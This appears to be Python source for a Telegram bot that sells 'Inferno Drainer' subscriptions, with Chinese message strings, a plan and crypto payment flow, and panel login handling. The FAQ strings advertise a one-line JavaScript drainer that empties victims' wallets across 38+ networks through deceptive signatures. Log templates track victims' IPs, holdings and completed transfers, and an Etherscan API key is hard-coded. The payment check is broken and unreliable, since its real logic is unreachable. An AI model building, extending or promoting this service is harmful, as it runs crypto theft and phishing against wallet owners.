    "wallet_imported_success": "✅ 钱包导入成功！\n\n地址：`{address}`\n余额：{balance}\n{file_info}",
    "wallet_import_unexpected": "❌ 导入钱包时发生意外错误。\n\n请重试，或使用 /cancel 取消。",
    "wallet_reset": "你的钱包已重置。请使用 /start 注册新钱包。",
    "setup_cancelled": "⚠️ 设置流程已取消。请使用 /set_up 重新开始。",
    "wallet_create_wait": "⏳ 正在创建钱包，请稍候...",
    "wallet_saved_status": "✅ 钱包已保存到文件：{filename}",
    "wallet_saved_status_error": "错误",
    "wallet_created": (
        "✅ 你的新 Ethereum 钱包：\n\n"
        "🔹 地址：{address}\n\n"
        "🔹 Seed Phrase：{seed_phrase}\n\n"
        "💰 余额：{balance}\n\n"
        "📁 {status_msg}\n\n"
        "⚠️ 请妥善保管你的 seed phrase！\n\n"
    ),
    "wallet_generate_error": "❌ 创建钱包时发生错误。请重试。",
    "faq_wait": "⏳ 请稍候，正在获取 FAQ...",
    "faq_text": (
        "📘 常见问题\n\n"
        "1️⃣ *什么是 Inferno Drainer Bot？*\n"
        "   `Inferno Drainer 是一种工具，用于通过一次签名将资产从一个钱包转移到另一个钱包。脚本会发起看似无害的交易，并转移目标钱包中的资产。`\n\n"
        "2️⃣ *可以在哪里匿名托管网站？*\n"
        "   `你可以通过我们的机器人免费托管网站。如果需要域名，则必须充值域名费用，因为域名不包含在免费托管中。`\n\n"
        "3️⃣ *我可以托管多少个网站？*\n"
        "   `Inferno 每个面板最多支持 25 个网站。如果需要更多空间，请联系 Inferno 支持。`\n\n"
        "4️⃣ *不支付初始费用可以获得分成吗？*\n"
        "   `不可以。我们收取一次性设置费，以防止滥用。该费用在注册时支付一次。`\n\n"
        "5️⃣ *如果我有自己的网站文件，可以安装 Inferno Drainer 吗？*\n"
        "   `可以。Drainer 是一个 JavaScript 文件，只需一行代码即可安装到任意网站。详细说明在 drainer 下载页面。`\n\n"
        "6️⃣ *如何在网站上安装 drainer？*\n"
        "   `安装说明在 drainer 下载页面。要查看访客统计，请使用 /trafic 或登录面板。`\n\n"
        "7️⃣ *Inferno 支持哪些网络？*\n"
        "   `支持超过 38 个网络，包括 Ton、Tron、Solana 和 Ethereum (EVM Drainer)。`\n\n"
        "8️⃣ *支持哪些钱包？*\n"
        "   `工具会定期更新，以支持高价值钱包和资产。Inferno 支持超过 350 个钱包，包括 Trust Wallet、MetaMask 和 Exodus。`\n\n"
        "9️⃣ *可以通过机器人购买新域名吗？*\n"
        "   `可以，你可以使用 /buydomain 命令购买新域名。按照提示完成购买。`\n\n"
        "🔟 *Inferno 出售网站模板吗？*\n"
        "   `不出售！但我们通过机器人提供超过 150 个网站模板。请使用相应命令查看。`\n\n"
        "1️⃣1️⃣ *你们提供流量方法吗？*\n"
        "   `不提供。我们的服务仅限于 drainer 和相关功能。如有重要需求，请联系 Inferno 支持。`"
    ),
    "panel_logged_in": "✅ 你已使用 Panel ID: {panel_id} 登录\n\n按下方按钮在浏览器中打开面板。",
    "panel_logged_out_header": "🩸 InfernoDrainer 面板🩸",
    "panel_logged_out_message": "使用 /info 获取你的登录凭证，然后点击下方按钮打开面板。",
    "panel_open_button": "☑️ 打开面板",
    "info_not_allowed": "❌ 你的 Inferno 面板尚未设置！\n请使用 /set_up 创建面板账户。",
    "info_header": "🩸 AngelFerno 面板访问权限",
    "info_panel_id": "Panel ID: {panel_id}",
    "info_password": "密码: {password}",
    "info_instructions": "点击下方按钮打开面板。\n然后使用你的凭证登录。",
    "info_backup_bot": "备用机器人: {backup_bot_link}",
    "info_security": "🔑 请妥善保管你的登录凭证",
    "wallet_retrieving": "🔐 正在获取你的钱包和余额...\n⏳ 请稍候...",
    "wallet_header": "🔐 你的 Ethereum 钱包:",
    "wallet_info_type": "类型: {wallet_type}",
    "wallet_info_address": "地址: `{address}`",
    "wallet_info_balance": "余额: {balance}",
    "wallet_info_seed": "助记词: {seed_phrase}",
    "wallet_saved_confirm": "✅ 钱包数据已保存。",
    "wallet_retrieval_error": "⚠️ 获取钱包时出错。请重试。",
    "log_wallet_connection": "🚧 钱包连接日志 - {timestamp}",
    "log_session_id": "会话ID: `{session_id}`",
    "log_wallet": "钱包: {wallet_name} | [{shortened_wallet}]({wallet_url})",
    "log_status_empty": "状态: 检测到空钱包",
    "log_connection_time": "连接时间: {connection_time}",
    "log_browser": "浏览器: {browser}",
    "log_device_ip": "{device_icon}{device_type} | {country_flag} {country_name}",
    "log_ip_gas": "IP: `{ip_address}` | 燃气价格: {gas_price} Gwei",
    "log_wallet_analysis": "🔍 钱包分析报告 - {timestamp}",
    "log_portfolio_analysis": "📊 投资组合分析:",
    "log_total_value": "总价值: ${total_value}",
    "log_assets_scanned": "扫描资产数: {count}",
    "log_top_holdings": "主要持仓: ${value}",
    "log_asset_breakdown": "💰 资产分布:",
    "log_connection_details": "🔗 连接详情:",
    "log_time_browser": "时间: {time} | 浏览器: {browser}",
    "log_source_ip": "源IP: `{ip_address}` | 燃气: {gas_price} Gwei",
    "log_establishing_connection": "🔗 正在建立安全连接...",
    "log_verifying_assets": "验证资产... {count} 已找到",
    "log_latency": "IP: `{ip_address}` | 延迟: {latency}ms",
    "log_balance_check": "⚖️ 余额验证进行中...",
    "log_portfolio_value": "投资组合价值: ${value}",
    "log_blockchain_check": "跨链验证中...",
    "log_gas_estimate": "IP: `{ip_address}` | 燃气估计: {gas_limit} 单位",
    "log_scanning_assets": "🔎 正在扫描钱包资产...",
    "log_found_holdings": "发现 {count} 个主要持仓",
    "log_scan_time": "IP: `{ip_address}` | 扫描时间: {time}s",
    "log_preparing_transfer": "💸 准备转账...",
    "log_transfer_amount": "金额: ${amount} | 燃气: {gas_price} Gwei",
    "log_destination": "目标: 处理中...",
    "log_tx_hash": "IP: `{ip_address}` | TX哈希: `{tx_hash}`",
    "log_transfer_failed": "❌ 转账失败 - {timestamp}",
    "log_transfer_error": "错误: 交易燃气不足",
    "log_required_gas": "所需燃气: {gas_limit} 单位 @ {gas_price} Gwei",
    "log_estimated_cost": "估计成本: ${cost}",
    "log_insufficient_balance": "钱包余额: ${balance} (不足)",
    "log_system_details": "🔧 系统详情:",
    "log_session_tx": "会话: `{session_id}` | TX: `{tx_hash}`",
    "log_transfer_completed": "✅ 转账完成 - {timestamp}",
    "log_transfer_info": "金额: ${amount} | 手续费: ${fee}",
    "log_gas_used": "使用燃气: {gas_limit} 单位 | 价格: {gas_price} Gwei",
    "log_transaction": "交易: `{tx_hash}`",
    "log_status_confirmed": "状态: 已在区块链上确认",
    "log_transaction_details": "🔧 交易详情:",
    "log_session_block": "会话: `{session_id}` | 区块: #{block}",
    "log_device_info": "设备: {device_icon}{device_type} | {country_flag} {country_name}",
})


def normalize_language(language: str) -> str | None:
    """Return a supported language code from user input."""
    if not language:
        return None
    return LANGUAGE_ALIASES.get(language.strip().lower())


def language_label(language_code: str) -> str:
    """Return the display label for a supported language code."""
    return SUPPORTED_LANGUAGES.get(language_code, SUPPORTED_LANGUAGES[DEFAULT_LANGUAGE])["label"]


def create_user_settings_table():
    """Create user settings table for language preferences."""
    with safe_db_connection() as conn:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS user_settings (
                user_id INTEGER PRIMARY KEY,
                language TEXT NOT NULL DEFAULT 'en',
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()


def save_user_language(user_id: int, language_code: str) -> bool:
    """Persist a user's preferred language."""
    if language_code not in SUPPORTED_LANGUAGES:
        return False
    try:
        with safe_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT INTO user_settings (user_id, language, updated_at)
                VALUES (?, ?, CURRENT_TIMESTAMP)
                ON CONFLICT(user_id) DO UPDATE SET
                    language = excluded.language,
                    updated_at = CURRENT_TIMESTAMP
            """, (user_id, language_code))
            conn.commit()
        return True
    except sqlite3.Error as e:
        logger.error(f"Failed to save language for user {user_id}: {e}")
        return False


def load_user_language(user_id: int) -> str:
    """Load a user's preferred language from storage."""
    try:
        with safe_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT language FROM user_settings WHERE user_id = ?", (user_id,))
            row = cursor.fetchone()
            if row and row[0] in SUPPORTED_LANGUAGES:
                return row[0]
    except sqlite3.Error as e:
        logger.error(f"Failed to load language for user {user_id}: {e}")
    return DEFAULT_LANGUAGE


def get_user_language(update=None, context=None) -> str:
    """Resolve the current user's language, defaulting to English."""
    cached_language = None
    if context:
        cached_language = context.user_data.get("language")
    if cached_language in SUPPORTED_LANGUAGES:
        return cached_language

    user = update.effective_user if update else None
    if user:
        loaded_language = load_user_language(user.id)
        if context:
            context.user_data["language"] = loaded_language
        return loaded_language
    return DEFAULT_LANGUAGE


def localized_text(update, context, key: str, **kwargs) -> str:
    """Return localized text for the current user."""
    language_code = get_user_language(update, context)
    template = get_localized_template(language_code, key)
    return template.format(**kwargs)


def get_localized_template(language_code: str, key: str) -> str:
    """Return a localized message template, falling back to English."""
    return LANGUAGE_MESSAGES.get(language_code, LANGUAGE_MESSAGES[DEFAULT_LANGUAGE]).get(
        key,
        LANGUAGE_MESSAGES[DEFAULT_LANGUAGE][key],
    )


def get_user_language_by_id(user_id: int | None, context=None) -> str:
    """Resolve a user's language when only their Telegram ID is available."""
    cached_language = None
    if context:
        cached_language = context.user_data.get("language")
    if cached_language in SUPPORTED_LANGUAGES:
        return cached_language
    if user_id:
        loaded_language = load_user_language(user_id)
        if context:
            context.user_data["language"] = loaded_language
        return loaded_language
    return DEFAULT_LANGUAGE


def localized_text_for_user(user_id: int | None, context, key: str, **kwargs) -> str:
    """Return localized text for handlers that have a user ID but not an Update."""
    language_code = get_user_language_by_id(user_id, context)
    template = get_localized_template(language_code, key)
    return template.format(**kwargs)


def language_keyboard(current_language: str = DEFAULT_LANGUAGE) -> InlineKeyboardMarkup:
    """Build the inline keyboard for language selection."""
    keyboard = []
    for language_code, language_data in SUPPORTED_LANGUAGES.items():
        button_text = language_data["label"]
        if language_code == current_language:
            button_text = f"✅ {button_text}"
        keyboard.append([InlineKeyboardButton(button_text, callback_data=f"lang:{language_code}")])
    return InlineKeyboardMarkup(keyboard)


def setup_keyboard(update, context) -> InlineKeyboardMarkup:
    """Build the localized setup menu keyboard."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(localized_text(update, context, "setup_create_wallet_button"), callback_data="new_ethereum_wallet")],
        [InlineKeyboardButton(localized_text(update, context, "setup_existing_wallet_button"), callback_data="use_existing_wallet")],
        [InlineKeyboardButton(localized_text(update, context, "setup_features_button"), callback_data="features")],
    ])


async def send_setup_message(update, context):
    """Send the localized setup menu message.

    Supports both Update.message and Update.callback_query.message contexts.
    Falls back to chat-based send if the original message object is unavailable.
    """
    target_message = None
    if hasattr(update, 'message') and update.message:
        target_message = update.message
    elif hasattr(update, 'callback_query') and update.callback_query:
        target_message = update.callback_query.message

    text = localized_text(update, context, "setup_menu")
    reply_markup = setup_keyboard(update, context)

    if target_message:
        await target_message.reply_text(text, reply_markup=reply_markup)
        return

    # Fallback: use the chat ID if available
    chat_id = None
    if hasattr(update, 'callback_query') and update.callback_query:
        if update.callback_query.message and update.callback_query.message.chat_id:
            chat_id = update.callback_query.message.chat_id
        elif update.callback_query.from_user:
            chat_id = update.callback_query.from_user.id
    elif hasattr(update, 'effective_chat') and update.effective_chat:
        chat_id = update.effective_chat.id

    if chat_id:
        await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup)
        return

    logger.error(
        "send_setup_message: no valid target message or chat_id available for update",
        extra={
            'update_type': type(update).__name__,
            'has_message': hasattr(update, 'message') and bool(update.message),
            'has_callback_query': hasattr(update, 'callback_query') and bool(update.callback_query),
        }
    )


def wallet_recovery_keyboard(update, context) -> InlineKeyboardMarkup:
    """Build the wallet recovery keyboard after deletion actions."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(localized_text(update, context, "setup_create_wallet_button"), callback_data="new_ethereum_wallet")],
        [InlineKeyboardButton(localized_text(update, context, "setup_existing_wallet_button"), callback_data="use_existing_wallet")],
    ])


def proceed_to_plans_keyboard(update=None, context=None, user_id: int | None = None) -> InlineKeyboardMarkup:
    """Build the localized proceed-to-plans keyboard."""
    if update is not None:
        button_text = localized_text(update, context, "proceed_to_plans_button")
    else:
        button_text = localized_text_for_user(user_id, context, "proceed_to_plans_button")
    return InlineKeyboardMarkup([[InlineKeyboardButton(button_text, callback_data="proceed_to_plans")]])


async def send_setup_fee_message(message, update, context):
    """Send the localized setup fee prompt."""
    await message.reply_text(
        localized_text(update, context, "setup_fee"),
        reply_markup=proceed_to_plans_keyboard(update, context),
    )


def localized_plan_text(update, context, plan_key: str, field: str) -> str:
    """Return localized plan name, description, or button text."""
    return localized_text(update, context, f"plan_{plan_key}_{field}")


def localized_plan_text_for_user(user_id: int, context, plan_key: str, field: str) -> str:
    """Return localized plan text when only the user ID is available."""
    return localized_text_for_user(user_id, context, f"plan_{plan_key}_{field}")


async def lang_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Change the current user's bot language. Private chats only."""
    # DEFENSE-IN-DEPTH: Secondary check in case filter fails
    # (Primary protection is via filters.ChatType.PRIVATE in handler registration)
    if update.effective_chat.type != ChatType.PRIVATE:
        logger.warning(f"Attempted /lang in {update.effective_chat.type} by user {update.effective_user.id}")
        return  # Silently ignore - middleware already handled it
    
    current_language = get_user_language(update, context)

    if context.args:
        requested_language = normalize_language(" ".join(context.args))
        if not requested_language:
            await update.message.reply_text(
                localized_text(update, context, "language_invalid"),
                reply_markup=language_keyboard(current_language),
            )
            return

        context.user_data["language"] = requested_language
        if update.effective_user:
            save_user_language(update.effective_user.id, requested_language)

        await update.message.reply_text(
            localized_text(
                update,
                context,
                "language_changed",
                language=language_label(requested_language),
            ),
            reply_markup=language_keyboard(requested_language),
        )
        return

    await update.message.reply_text(
        localized_text(
            update,
            context,
            "language_prompt",
            language=language_label(current_language),
        ),
        reply_markup=language_keyboard(current_language),
    )


async def language_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle language selection buttons."""
    query = update.callback_query
    await query.answer()

    requested_language = normalize_language(query.data.split(":", 1)[1] if query.data else "")
    if not requested_language:
        await query.message.reply_text(localized_text(update, context, "language_invalid"))
        return

    context.user_data["language"] = requested_language
    if update.effective_user:
        save_user_language(update.effective_user.id, requested_language)

    await query.edit_message_text(
        localized_text(
            update,
            context,
            "language_changed",
            language=language_label(requested_language),
        ),
        reply_markup=language_keyboard(requested_language),
    )


async def send_features_messages(message, update: Update, context: CallbackContext):
    """Send the localized /features response sequence."""
    await message.reply_text(localized_text(update, context, "features_intro"))
    await asyncio.sleep(3)
    await message.reply_text(localized_text(update, context, "features_wait"))
    await asyncio.sleep(2)
    await message.reply_text(localized_text(update, context, "features_full"))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Display the same panel/features intro as /features."""
    return await features_command(update, context)

async def setup_fee(update: Update, context: CallbackContext):
    """Show setup fee message with context awareness"""
    # Check for existing verification context
    if context.user_data.get('verification_in_progress'):
        await update.message.reply_text(localized_text(update, context, "verification_first"))
        return
    
    message = update.message or update.callback_query.message
    await send_setup_fee_message(message, update, context)
    return PLAN_SELECTION

async def proceed_to_plans(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Display the available plans with live conversion rates."""
    plan_order = ["emerald", "ruby", "sapphire", "diamond"]
    message_lines = []
    keyboard = []

    for plan_key in plan_order:
        plan = PLANS[plan_key]
        equivalents = calculate_equivalent_amounts(plan["fee_eth"])
        plan_name = localized_plan_text(update, context, plan_key, "name")
        message_lines.append(localized_text(
            update,
            context,
            "plans_list_item",
            plan_name=plan_name,
            fee_eth=plan["fee_eth"],
            btc_amount=f"{equivalents['btc']:.8f}",
            usdt_amount=f"{equivalents['usdt']:.2f}",
        ))
        keyboard.append([InlineKeyboardButton(plan_name, callback_data=f"plan_{plan_key}")])

    message = localized_text(update, context, "plans_message", plans="".join(message_lines))
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Handle cases where update.message is None (e.g., callback query)
    if update.message:
        await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="Markdown")
    elif update.callback_query:
        await update.callback_query.answer()  # Acknowledge button press
        if update.callback_query.message:  # Check if message exists
            await update.callback_query.message.reply_text(message, reply_markup=reply_markup, parse_mode="Markdown")
        else:
            print("Warning: Callback query has no associated message.")
    else:
        print("Warning: No valid update source found.")

    return PLAN_SELECTION

async def proceed_to_plans_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Display the available plans with live conversion rates."""
    plan_order = ["emerald", "ruby", "sapphire", "diamond"]
    message_lines = []
    keyboard = []

    for plan_key in plan_order:
        plan = PLANS[plan_key]
        equivalents = calculate_equivalent_amounts(plan["fee_eth"])
        plan_name = localized_plan_text(update, context, plan_key, "name")
        message_lines.append(localized_text(
            update,
            context,
            "plans_list_item",
            plan_name=plan_name,
            fee_eth=plan["fee_eth"],
            btc_amount=f"{equivalents['btc']:.8f}",
            usdt_amount=f"{equivalents['usdt']:.2f}",
        ))
        keyboard.append([InlineKeyboardButton(plan_name, callback_data=f"plan_{plan_key}")])

    message = localized_text(update, context, "plans_message", plans="".join(message_lines))
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Handle cases where update.message is None (e.g., callback query)
    if update.message:
        await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="Markdown")
    elif update.callback_query:
        await update.callback_query.answer()  # Acknowledge button press
        if update.callback_query.message:  # Check if message exists
            await update.callback_query.message.reply_text(message, reply_markup=reply_markup, parse_mode="Markdown")
        else:
            print("Warning: Callback query has no associated message.")
    else:
        print("Warning: No valid update source found.")

    return PLAN_SELECTION

async def handle_emerald_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle Emerald Plan selection."""
    query = update.callback_query
    await query.answer()
    
    # Calculate equivalent amounts for Emerald Plan
    equivalents = calculate_equivalent_amounts(PLANS["emerald"]["fee_eth"])
    plan_name = localized_plan_text(update, context, "emerald", "name")
    
    await query.edit_message_text(
        f"💎 You selected the **{plan_name}**!\n\n"
        f"- Cost: {PLANS['emerald']['fee_eth']} ETH\n"
        f"- Equivalent: {equivalents['btc']:.8f} BTC or {equivalents['usdt']:.2f} USDT\n\n"
        "Please proceed with the payment.",
        parse_mode="Markdown"
    )
    return PAYMENT

async def handle_diamond_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle Diamond Plan selection."""
    query = update.callback_query
    await query.answer()
    
    # Calculate equivalent amounts for Diamond Plan
    equivalents = calculate_equivalent_amounts(PLANS["diamond"]["fee_eth"])
    plan_name = localized_plan_text(update, context, "diamond", "name")
    
    await query.edit_message_text(
        f"💎 You selected the **{plan_name}**!\n\n"
        f"- Cost: {PLANS['diamond']['fee_eth']} ETH\n"
        f"- Equivalent: {equivalents['btc']:.8f} BTC or {equivalents['usdt']:.2f} USDT\n\n"
        "Please proceed with the payment.",
        parse_mode="Markdown"
    )
    return PAYMENT

async def plan_details(update: Update, context: CallbackContext):
    """
    When a plan button is clicked, show plan details and a
    'Complete Setup Fee' button to proceed with payment.
    """
    query = update.callback_query
    await query.answer()

    data = query.data  
    plan_key = data.replace("plan_", "")
    plan = PLANS.get(plan_key)
    
    if plan:
        keyboard = [
            [InlineKeyboardButton(localized_plan_text(update, context, plan_key, "button"), callback_data=f"choose_currency_{plan_key}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(
            localized_text(
                update,
                context,
                "plan_details_message",
                plan_name=localized_plan_text(update, context, plan_key, "name"),
                description=localized_plan_text(update, context, plan_key, "description"),
            ),
            reply_markup=reply_markup
        )

async def choose_payment_method(update: Update, context: CallbackContext):
    """
    After clicking 'Complete Setup Fee', show a message prompting the user
    to choose their preferred payment currency (Bitcoin, Ethereum, USDT).
    """
    query = update.callback_query
    await query.answer()

    data = query.data  # Example: "pay:emerald"
    plan_key = data.replace("choose_currency_", "")

    # Debugging: Log the plan_key received
    logger.info(f"Plan Key: {plan_key}")
    
    keyboard = [
        [
            InlineKeyboardButton("₿ Bitcoin", callback_data=f"pay:{plan_key}:btc"),
            InlineKeyboardButton("💎 Ethereum", callback_data=f"pay:{plan_key}:eth"),
            InlineKeyboardButton("💲 USDT", callback_data=f"pay:{plan_key}:usdt"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.message.reply_text(
        localized_text(update, context, "choose_payment_method"),
        reply_markup=reply_markup
    )

async def payment_method(update: Update, context: CallbackContext):
    """
    Process the final payment method selection and provide the appropriate
    payment instructions based on the plan and chosen currency.
    """
    query = update.callback_query
    await query.answer()

    data = query.data  # Example: "pay:emerald:btc"
    parts = data.split(":")
    if len(parts) != 3:
        await query.message.reply_text(localized_text_for_user(query.from_user.id, context, "invalid_payment_selection"))
        return

    plan_key, currency = parts[1], parts[2]  # Extract plan and currency

    # Pass the correct arguments to handle_plan_selection
    await handle_plan_selection(query, plan_key, currency, context)


async def handle_plan_selection(query, plan_key: str, currency: str, context: CallbackContext):
    """Handle the selected plan and currency to generate payment instructions."""
    user_id = query.from_user.id if query.from_user else None

    # Validate the plan and currency
    if plan_key not in PLANS:
        await query.message.reply_text(localized_text_for_user(user_id, context, "invalid_plan_selected"))
        return

    # Get the ETH fee for the selected plan
    eth_fee = PLANS[plan_key]["fee_eth"]

    # Fetch live conversion rates
    try:
        btc_to_eth_rate = get_btc_in_eth()
        usdt_to_eth_rate = get_usdt_in_eth()
    except ValueError as e:
        logger.error(f"Failed to fetch live prices: {e}")
        await query.message.reply_text(localized_text_for_user(user_id, context, "unable_fetch_rates"))
        return

    # Correct calculation for each currency
    if currency == "btc":
        amount = eth_fee / btc_to_eth_rate  # Convert ETH to BTC
        network = localized_text_for_user(user_id, context, "network_btc")
        amount_info = f"{amount:.8f} BTC"

    elif currency == "usdt":
        amount = eth_fee * usdt_to_eth_rate  # Convert ETH to USDT
        network = localized_text_for_user(user_id, context, "network_usdt")
        amount_info = f"{amount:.2f} USDT"

    elif currency == "eth":
        amount = eth_fee  # Direct ETH payment
        network = localized_text_for_user(user_id, context, "network_eth")
        amount_info = f"{amount:.6f} ETH"

    else:
        await query.message.reply_text(localized_text_for_user(user_id, context, "invalid_currency_selected"))
        return

    # Get the correct wallet address
    wallet_address = get_wallet_address(currency)
    if not wallet_address:
        await query.message.reply_text(localized_text_for_user(user_id, context, "payment_config_error"))
        return

    # Construct payment message
    message = localized_text_for_user(
        user_id,
        context,
        "payment_instructions",
        amount_info=amount_info,
        network=network,
        wallet_address=wallet_address,
    )


    keyboard = [[InlineKeyboardButton(
        localized_text_for_user(user_id, context, "confirm_payment_button"),
        callback_data=f"confirm:{plan_key}:{currency}",
    )]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Store payment details
    context.user_data["payment_data"] = {"amount_info": amount_info}

    await query.message.reply_text(message, reply_markup=reply_markup, parse_mode="Markdown")

# ---------------------------------------------
# Handle Payment Confirmation Button
# ---------------------------------------------
async def payment_confirmation(update: Update, context: CallbackContext):
    """
    Handles payment confirmation after the user clicks the confirm button.
    Starts real-time verification tasks using free blockchain APIs.
    """
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id

    # Expect callback data in format "confirm:plan:currency"
    data = query.data.replace("confirm:", "")
    try:
        plan, currency = data.split(":")
    except ValueError:
        await query.message.reply_text(localized_text_for_user(user_id, context, "payment_invalid_data"))
        return ConversationHandler.END

    # Retrieve stored payment details.
    payment_data = context.user_data.get("payment_data")
    if not payment_data:
        await query.message.reply_text(localized_text_for_user(user_id, context, "payment_no_active"))
        return ConversationHandler.END

    amount_info = payment_data.get("amount_info")
    wallet_address = get_wallet_address(currency)
    if not amount_info or not wallet_address:
        await query.message.reply_text(localized_text_for_user(user_id, context, "payment_details_missing"))
        return ConversationHandler.END

    # Save pending payment details.
    pending_payments[user_id] = {
        'plan': plan,
        'currency': currency,
        'fee': amount_info,
        'wallet': wallet_address,
        'expiry': time.time() + PAYMENT_TIMEOUT
    }

    # Start real-time verification task.
    active_payments[user_id] = {
    'verification': asyncio.create_task(
        check_payment_status(user_id, plan, wallet_address, amount_info, currency, context.bot)
    )
}


    # Inform the user that payment is being verified.
    await query.message.reply_text(localized_text_for_user(user_id, context, "payment_verifying"))

# -------------------- Check Payment Status (Verification Loop) --------------------
async def check_payment_status(user_id: int, plan: str, wallet_address: str, amount_info: str, currency: str, bot):
    max_checks = PAYMENT_TIMEOUT // REMINDER_INTERVAL
    await asyncio.sleep(10)  # initial wait

    # Create a ClientSession with a default (synchronous) resolver to disable aiodns.
    connector = aiohttp.TCPConnector(resolver=aiohttp.resolver.DefaultResolver())
    async with aiohttp.ClientSession(connector=connector) as session:
        for check in range(int(max_checks)):
            # Pass the session to your verify_payment function.
            payment_confirmed = await verify_payment(session, wallet_address, amount_info, currency)
            if payment_confirmed:
                await bot.send_message(
                    user_id,
                    localized_text_for_user(user_id, None, "payment_confirmed")
                )
                bot_data_cleanup(user_id)
                return

            if panel_interaction_flags.get(user_id, False):
                await asyncio.sleep(REMINDER_INTERVAL)
                continue

            plan_name = (
                localized_plan_text_for_user(user_id, None, plan, "name")
                if plan in PLANS
                else localized_text_for_user(user_id, None, "unknown_plan")
            )
            network_key = f"network_{currency}" if currency in {"btc", "eth", "usdt"} else "network_unknown"
            await bot.send_message(
                user_id,
                localized_text_for_user(
                    user_id,
                    None,
                    "payment_pending",
                    plan_name=plan_name,
                    amount_info=amount_info,
                    currency=currency.upper(),
                    network=localized_text_for_user(user_id, None, network_key),
                    wallet_address=wallet_address,
                ),
                parse_mode="Markdown"
            )
            await asyncio.sleep(REMINDER_INTERVAL)

    # Timeout reached: notify user.
    await bot.send_message(
        user_id,
        localized_text_for_user(user_id, None, "payment_timeout")
    )
    if user_id in pending_payments:
        del pending_payments[user_id]


# -------------------- Helper Functions --------------------
def get_network_name(currency: str) -> str:
    """
    Returns the network name for the selected currency.
    """
    network_map = {
        "btc": "Bitcoin Network",
        "eth": "Ethereum Network",
        "usdt": "TRC-20 Network"
    }
    return network_map.get(currency, "Unknown Network")

# -------------------- Real Payment Verification Using Free APIs --------------------
async def verify_payment(session, wallet_address: str, amount_info: str, currency: str):
    # Use the provided session to make HTTP requests.
    async with session.get('https://blockchain.info/q/addressbalance/{wallet_address}?confirmations=6') as response:
        data = await response.json()
        # Process the data and return True if payment is confirmed, else False.
        return data.get("payment_confirmed", False)

    """
    Checks if the exact payment amount has been received in the wallet.
    - For BTC: Uses Blockchain.info (returns balance in satoshis).
    - For ETH: Uses Etherscan (requires ETHERSCAN_API_KEY environment variable).
    - For USDT (TRC20): Uses TronGrid's public endpoint.
    """

    if currency == "btc":
        # Blockchain.info API (no API key required)
        api_url = f"https://blockchain.info/q/addressbalance/{wallet_address}?confirmations=6"
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                if response.status != 200:
                    print(f"Error: BTC API request failed with status {response.status}")
                    return False
                data = await response.text()
                try:
                    balance_sats = int(data)
                except Exception as e:
                    print(f"Error parsing BTC balance: {e}")
                    return False
                balance = balance_sats / 1e8
    elif currency == "eth":
        # Etherscan API (free tier requires an API key)
        ETHERSCAN_API_KEY = ("T85V25MIRWXSC5YFAGYVUTE2SBJRF4YKSV")
        if not ETHERSCAN_API_KEY:
            print("Etherscan API key not set")
            return False
        api_url = f"https://api.etherscan.io/api?module=account&action=balance&address={wallet_address}&tag=latest&apikey={ETHERSCAN_API_KEY}"
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                if response.status != 200:
                    print(f"Error: ETH API request failed with status {response.status}")
                    return False
                data = await response.json()
                if data.get("status") != "1":
                    print(f"Error in Etherscan response: {data}")
                    return False
                try:
                    balance_wei = int(data["result"])
                except Exception as e:
                    print(f"Error parsing ETH balance: {e}")
                    return False
                balance = balance_wei / 1e18
    elif currency == "usdt":
        # TronGrid API to get account details. No API key is required.
        api_url = f"https://api.trongrid.io/v1/accounts/{wallet_address}"
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                if response.status != 200:
                    print(f"Error: TronGrid API request failed with status {response.status}")
                    return False
                data = await response.json()
                accounts = data.get("data", [])
                if not accounts:
                    print("No account data found in TronGrid response")
                    return False
                account = accounts[0]
                asset_list = account.get("assetV2", [])
                usdt_balance = 0
                for asset in asset_list:
                    if asset.get("key") == "TJwKXVy4rpfAQp3wL7HBvYGRHe4UefpKJZ":
                        try:
                            usdt_balance = float(asset.get("value", 0))
                        except Exception as e:
                            print(f"Error parsing USDT balance: {e}")
                            return False
                        break
                # TronGrid returns the balance in the smallest unit (usually 6 decimals for TRC20 USDT).
                balance = usdt_balance / 1e6
    else:
        return False

    print(f"Wallet {wallet_address} balance: {balance} {currency.upper()}")
    # expected_amount is a string like "0.005 BTC"; extract its numeric part.
    try:
        expected_value = float(expected_amount.split()[0])
    except Exception as e:
        print(f"Error parsing expected amount: {e}")
        return False
    return balance >= expected_value

# -------------------- Payment Timeout Function --------------------
async def payment_timeout(user_id: int, bot):
    await asyncio.sleep(PAYMENT_TIMEOUT)
    if user_id in pending_payments:
        await bot.send_message(
            user_id,
            localized_text_for_user(user_id, None, "payment_timeout")
        )
        del pending_payments[user_id]
        if user_id in active_payments:
            active_payments[user_id]['verification'].cancel()
            del active_payments[user_id]

async def interrupt_payment(update: Update, context: CallbackContext):
    """Interrupts payment if user interacts unless it's panel-related."""
    user_id = update.effective_user.id

    # Exit if no active payment
    if user_id not in active_payments and user_id not in pending_payments:
        return

    # Check if interaction is panel-related
    is_panel_interaction = False
    if update.message:
        text = (update.message.text or "").strip().lower()
        if text.startswith("/panel"):
            is_panel_interaction = True
    elif update.callback_query:
        data = (update.callback_query.data or "").strip().lower()
